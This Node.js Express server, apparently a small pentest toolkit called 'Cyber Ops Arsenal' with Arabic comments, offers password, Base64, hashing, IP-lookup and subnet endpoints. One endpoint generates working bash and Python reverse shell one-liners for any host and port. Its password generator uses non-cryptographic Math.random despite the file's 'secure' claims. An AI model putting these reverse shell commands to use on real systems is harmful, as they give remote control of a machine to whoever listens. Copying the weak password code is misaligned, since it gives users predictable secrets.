// server.js - Secured Version 1.2
// Developed by CyberMan Ops - Full Protection & Optimization Enabled

const express = require('express');
const cors = require('cors');
const rateLimit = require('express-rate-limit');
const multer = require('multer');
const crypto = require('crypto');
const fetch = require('node-fetch');
const path = require('path');
const net = require('net');

const app = express();
const upload = multer({ storage: multer.memoryStorage() });

// ✅ 1. الإعدادات الأمنية للهيدرز (حماية من Clickjacking & XSS)
app.use((req, res, next) => {
    res.setHeader("X-Frame-Options", "DENY"); // تمنع عرض الموقع داخل iframe
    res.setHeader("X-Content-Type-Options", "nosniff"); // تمنع تخمين نوع الملفات
    res.setHeader("X-XSS-Protection", "1; mode=block"); // تفعيل فلتر XSS
    next();
});

// ✅ 2. الإعدادات الأساسية
app.use(express.json());
app.use(cors({ origin: '*' }));

// ✅ 3. حماية الـ Rate Limit (سد ثغرة الـ DoS والـ Probing)
const limiter = rateLimit({
    windowMs: 5 * 60 * 1000, // 5 دقائق
    max: 30, // حد أقصى 30 طلب لكل IP لضمان الأمان
    standardHeaders: true,
    legacyHeaders: false,
    message: {
        status: 429,
        error: "🛡️ Cyber Ops Defense: Too many requests. System on high alert."
    }
});
app.use(limiter);

// ✅ 4. ربط ملفات الـ HTML والـ CSS (فولدر public)
app.use(express.static(path.join(__dirname, 'public')));

// المسار الرئيسي
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

/* -------------------------
   الـ APIs الخاصة بالترسانة
   ------------------------- */

// 1) توليد باسوورد آمن
app.get('/api/password', (req, res) => {
    const length = parseInt(req.query.len) || 16;
    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{};:,.<>?';
    let pass = '';
    for (let i = 0; i < length; i++) pass += chars[Math.floor(Math.random() * chars.length)];
    res.json({ password: pass });
});

// 2) Base64 Encode/Decode
app.post('/api/base64/encode', (req, res) => {
    const txt = (req.body.text || '');
    const b64 = Buffer.from(txt, 'utf8').toString('base64');
    res.json({ base64: b64 });
});

app.post('/api/base64/decode', (req, res) => {
    const b64 = (req.body.base64 || '');
    try {
        const txt = Buffer.from(b64, 'base64').toString('utf8');
        res.json({ text: txt });
    } catch (e) {
        res.status(400).json({ error: 'invalid base64' });
    }
});

// 3) فحص الـ Hash للملفات (SHA-256)
app.post('/api/hash-file', upload.single('file'), async (req, res) => {
    if (!req.file) return res.status(400).json({ error: 'no file uploaded' });
    const hash = crypto.createHash('sha256').update(req.file.buffer).digest('hex');
    res.json({ filename: req.file.originalname, sha256: hash });
});

// 4) فحص الموقع الجغرافي للـ IP
app.get('/api/ip-geo/:ip', async (req, res) => {
    const ip = req.params.ip || '';
    try {
        const resp = await fetch(`http://ip-api.com/json/${encodeURIComponent(ip)}?fields=status,country,regionName,city,isp,query`);
        const data = await resp.json();
        res.json({ source: 'ip-api.com', data });
    } catch (e) {
        res.status(500).json({ error: 'lookup failed' });
    }
});

// 5) Reverse Shell Generator
app.post('/api/rev-shell/generate', (req, res) => {
    const lhost = (req.body.lhost || '').trim();
    const lport = (req.body.lport || '').trim();
    if (!lhost || !lport) return res.status(400).json({ error: 'lhost and lport required' });
    res.json({
        bash: `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`,
        python: `python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${lhost}",${lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'`
    });
});

// 6) Network Calculator
app.post('/api/network-calc', (req, res) => {
    const ip = (req.body.ip || '').trim();
    const cidr = Number(req.body.cidr);
    if (!ip || isNaN(cidr) || cidr < 0 || cidr > 32) return res.status(400).json({ error: 'invalid input' });
    const parts = ip.split('.').map(p => Number(p));
    const ipNum = ((parts[0] << 24) >>> 0) + (parts[1] << 16) + (parts[2] << 8) + parts[3];
    const mask = cidr === 0 ? 0 : (~0 << (32 - cidr)) >>> 0;
    const net = (ipNum & mask) >>> 0;
    const netOctets = [(net >>> 24) & 255, (net >>> 16) & 255, (net >>> 8) & 255, net & 255];
    res.json({ network: netOctets.join('.') + '/' + cidr });
});

/* -----------------------------
   تشغيل السيرفر وحماية السوكيت
   -----------------------------*/
const PORT = process.env.PORT || 3000;

const server = app.listen(PORT, () => {
    console.log(`
    🛡️  ==========================================
    🛡️  CYBER OPS ARSENAL - SECURE MODE V1.2 ACTIVE
    🛡️  Port: ${PORT} | DoS Protection: ON
    🛡️  ==========================================
    `);
});

// ✅ سد ثغرة Slowloris (الطلبات الناقصة)
server.headersTimeout = 10000; // إغلاق الاتصال لو الهيدرز تأخرت عن 10 ثوانٍ
server.requestTimeout = 15000; // إغلاق الطلب لو استغرق أكثر من 15 ثانية
server.keepAliveTimeout = 5000; // تقليل وقت الانتظار لمنع استنزاف الموارد

// حماية السوكيت من الاتصالات المعلقة
server.on('connection', (socket) => {
    socket.setTimeout(10000);
    socket.on('timeout', () => {
        socket.destroy();
    });
});